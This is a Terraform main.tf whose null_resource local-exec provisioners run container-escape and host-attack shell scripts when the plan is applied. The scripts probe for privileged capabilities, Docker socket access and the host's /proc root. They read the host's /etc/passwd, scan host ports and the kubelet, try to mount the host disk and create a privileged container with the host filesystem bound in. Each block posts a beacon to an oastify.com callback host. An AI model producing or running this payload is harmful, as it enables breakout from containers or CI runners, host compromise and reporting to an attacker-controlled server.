# main.tf - Container Escape Attempts
resource "null_resource" "container_escape" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== CONTAINER ESCAPE ATTEMPTS ==="
      
      # 1. Check for privileged container
      echo "=== PRIVILEGE CHECK ==="
      if [ -w /dev/kmsg ]; then echo "PRIVILEGED CONTAINER - HOST ACCESS POSSIBLE"; fi
      cat /proc/self/status | grep -i cap
      ls -la /proc/1/root/ 2>/dev/null && echo "HOST FILESYSTEM ACCESSIBLE VIA PROC"
      
      # 2. Check for Docker socket access
      echo "=== DOCKER SOCKET CHECK ==="
      ls -la /var/run/docker.sock 2>/dev/null && echo "DOCKER SOCKET FOUND - HOST COMPROMISE POSSIBLE"
      curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null && echo "DOCKER API ACCESSIBLE"
      
      # 3. Mount escape attempts
      echo "=== MOUNT ESCAPE ==="
      mount | grep -v tmpfs | grep -v cgroup
      find / -name "*.sock" -type s 2>/dev/null | head -10
      
      # 4. Kernel exploit checks
      echo "=== KERNEL EXPLOIT CHECK ==="
      uname -a
      cat /etc/os-release
      which gcc && echo "GCC AVAILABLE - COMPILE EXPLOITS" || echo "No GCC"
      
      # 5. Service discovery on host
      echo "=== HOST SERVICE DISCOVERY ==="
      for port in 21 22 23 80 443 2375 2376 5000 8000 8080 9000; do
        timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$port" 2>/dev/null && echo "Host port $port OPEN - $(
          case $port in
            22) echo "SSH" ;;
            80|443) echo "WEB" ;;
            2375|2376) echo "DOCKER API" ;;
            5000) echo "DOCKER REGISTRY" ;;
            8000|8080|9000) echo "MANAGEMENT" ;;
            *) echo "UNKNOWN" ;;
          esac
        )"
      done
      
      curl -X POST -d "escape_attempts_started=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/escape
    EOT
  }
}

resource "null_resource" "docker_socket_exploit" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== DOCKER SOCKET EXPLOITATION ==="
      
      # If Docker socket is available, exploit it
      if [ -w /var/run/docker.sock ]; then
        echo "DOCKER SOCKET EXPLOITATION ATTEMPT"
        
        # List all containers
        echo "=== ALL CONTAINERS ==="
        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool 2>/dev/null || curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
        
        # Run privileged container on host
        echo "=== ATTEMPTING PRIVILEGED CONTAINER ==="
        curl -s --unix-socket /var/run/docker.sock -X POST \
          -H "Content-Type: application/json" \
          -d '{
            "Image": "alpine",
            "Cmd": ["sh", "-c", "echo 'container_escape_success' > /tmp/host_compromised"],
            "HostConfig": {
              "Privileged": true,
              "Binds": ["/:/host"]
            }
          }' \
          http://localhost/containers/create
          
        echo "Docker socket exploitation attempted"
      else
        echo "No Docker socket access"
      fi
      
      curl -X POST -d "docker_exploit_attempted=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/docker
    EOT
  }
}

resource "null_resource" "host_service_attack" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== HOST SERVICE ATTACKS ==="
      
      # 1. Try to access Docker API on host
      echo "=== DOCKER API ON HOST ==="
      curl -s http://172.17.0.1:2375/version 2>/dev/null && echo "DOCKER API EXPOSED ON HOST - CRITICAL"
      curl -s http://172.17.0.1:2376/version 2>/dev/null && echo "DOCKER TLS API EXPOSED"
      
      # 2. Try common web services on host
      echo "=== HOST WEB SERVICES ==="
      curl -s http://172.17.0.1:80/ 2>/dev/null && echo "HTTP service on host"
      curl -s http://172.17.0.1:443/ 2>/dev/null && echo "HTTPS service on host"
      curl -s http://172.17.0.1:8080/ 2>/dev/null && echo "Port 8080 service"
      curl -s http://172.17.0.1:9000/ 2>/dev/null && echo "Port 9000 service (often Docker UI)"
      
      # 3. Try SSH exploits (common weak credentials)
      echo "=== SSH ATTEMPTS ==="
      which sshpass && echo "sshpass available" || echo "no sshpass"
      which hydra && echo "hydra available" || echo "no hydra"
      
      # 4. Check for Kubernetes
      echo "=== KUBERNETES CHECK ==="
      ls /var/run/secrets/kubernetes.io/ 2>/dev/null && echo "KUBERNETES ENVIRONMENT - CRITICAL"
      curl -s http://172.17.0.1:10250/ 2>/dev/null && echo "KUBELET EXPOSED - CRITICAL"
      
      curl -X POST -d "host_services_checked=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/hostservices
    EOT
  }
}

resource "null_resource" "proc_escape" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== PROC FILESYSTEM ESCAPE ==="
      
      # 1. Check if we can access host via proc
      if [ -d /proc/1/root ]; then
        echo "HOST PROC ACCESSIBLE - ATTEMPTING ESCAPE"
        ls -la /proc/1/root/etc/passwd 2>/dev/null && echo "HOST PASSWD ACCESSIBLE"
        ls -la /proc/1/root/var/run/docker.sock 2>/dev/null && echo "HOST DOCKER SOCKET VISIBLE"
        
        # Try to read host files
        cat /proc/1/root/etc/passwd | head -5 2>/dev/null
        cat /proc/1/root/etc/hostname 2>/dev/null && echo "Host hostname: $(cat /proc/1/root/etc/hostname)"
      else
        echo "No host proc access"
      fi
      
      # 2. Check for SYS_ADMIN capability
      if capsh --print 2>/dev/null | grep -q sys_admin; then
        echo "SYS_ADMIN CAPABILITY - MOUNT ESCAPE POSSIBLE"
        # Try to mount host filesystem
        mkdir -p /mnt/host
        mount /dev/sda1 /mnt/host 2>/dev/null && echo "HOST FILESYSTEM MOUNTED" || echo "Mount failed"
      fi
      
      curl -X POST -d "proc_escape_attempted=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/procescape
    EOT
  }
}
